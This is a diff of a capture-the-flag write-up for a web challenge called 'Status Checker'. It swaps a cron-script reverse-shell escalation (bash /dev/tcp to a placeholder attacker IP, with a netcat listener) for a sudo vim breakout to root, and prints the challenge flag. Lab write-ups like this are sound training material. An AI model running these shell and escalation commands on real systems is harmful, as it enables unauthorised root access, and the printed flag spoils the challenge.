@@ -26,35 +26,18 @@ Click on the "Check HTTP Status" and observe that the website has hung. Return t
 
 ![wimg-5](https://github.com/lenebread/GiTxHextech-Challenge-Repo/blob/a0a1f11bace0c0ed057208ff3d3ce65661dfe2af/challenges/web/Status%20Checker/images/wimg-5.png)
 
-We can spawn an interactive shell using the command ``script -qc /bin/bash /dev/null``. Once done, we can explore the system. Navigating to the ``/var/www/`` directory and we can see 2 files.
+We can spawn an interactive shell using the command ``script -qc /bin/bash /dev/null``. Once done, we can explore the system. We can use the command ``sudo -l`` and see that we can run the command ``vim`` as root without a password as seen in the following screenshot.
 
-The files are:
-- backup.sh - Owned by the root user.
-- my-script.sh - Owned by the www-data user.
+![wimg-6](https://github.com/lenebread/GiTxHextech-Challenge-Repo/blob/64886584ff8936fb97898bbd2e3c574d9482bacc/challenges/web/Status%20Checker/images/wimg-6.png)
 
-![wimg-6](https://github.com/lenebread/GiTxHextech-Challenge-Repo/blob/a0a1f11bace0c0ed057208ff3d3ce65661dfe2af/challenges/web/Status%20Checker/images/wimg-6.png)
-
-We can see that the ``backup.sh`` file runs the ``my-script.sh`` file as sudo, effectively running as the root user.
-
-Using the command ``cat /etc/crontab``, we can see that there is a cronjob that runs the ``backup.sh`` file every minute. We can abuse this by changing the contents of the ``my-script.sh`` file.
-
-As we own the ``my-script.sh`` file, we can modify it to spawn a reverse shell using the following commands:
+Using GTFOBins, we are able to breakout and obtain a shell as a root user using the following command:
 
 ```
-echo '#/bin/bash' > my-script.sh
-echo 'bash -i >& /dev/tcp/YOUR-IP-HERE/PORT-HERE 0>&1' >> my-script.sh
+vim -c ':!/bin/sh'
 ```
 
-Replace ``YOUR-IP-HERE`` with your IP address and ``PORT-HERE`` with your desired port number. Once done, start another netcat listener on the port that was chosen in the above command. In this example, it will be 45102 as seen in the following screenshot.
+Using the command ``whoami`` we can see that we are now the root user as seen in the following screenshot.
 
-![wimg-7](https://github.com/lenebread/GiTxHextech-Challenge-Repo/blob/a0a1f11bace0c0ed057208ff3d3ce65661dfe2af/challenges/web/Status%20Checker/images/wimg-7.png)
+![wimg-7](https://github.com/lenebread/GiTxHextech-Challenge-Repo/blob/64886584ff8936fb97898bbd2e3c574d9482bacc/challenges/web/Status%20Checker/images/wimg-7.png)
 
-Once done, wait for the cronjob to run the script. This should take a minute or two. 
-
-Once the script is ran and we are able to get a reverse shell as the root user, we can use the command ``script -qc /bin/bash /dev/null`` again to spawn an interactive shell as seen in the following screenshot.
-
-![wimg-8]()
-
-We can obtain the flag in the root directory. The flag is ``HEX{N3tw0rK_ErR_500_W1kS2kKiL}``
-
-![wimg-9]()
+We can obtain the flag in the root directory by using the command ``cd /root`` and ``cat flag.txt``. The flag is ``HEX{N3tw0rK_ErR_500_W1kS2kKiL}``.
